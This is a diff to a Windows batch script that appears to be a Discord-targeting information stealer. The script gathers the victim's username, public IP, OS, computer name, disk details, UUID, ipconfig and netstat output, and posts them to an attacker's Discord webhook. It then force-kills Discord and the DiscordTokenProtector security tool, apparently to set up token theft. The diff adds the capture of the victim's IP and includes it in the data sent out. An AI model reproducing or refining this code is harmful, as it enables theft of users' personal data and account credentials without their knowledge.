@@ -1,7 +1,7 @@
 @echo off
-timeout 2 > nul
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
+set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
 echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size >> %userprofile%\AppData\Local\Temp\System_INFO.txt
 echo Service Tag: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
@@ -13,7 +13,7 @@ wmic csproduct get uuid > %userprofile%\AppData\Local\Temp\uuid.txt
 ipconfig /all > %userprofile%\AppData\Local\Temp\ip.txt
 netstat -an > %userprofile%\AppData\Local\Temp\netstat.txt
 
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username% ip = %ip% time = %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 taskkill /im Discord.exe /f
 taskkill /im DiscordTokenProtector.exe /f
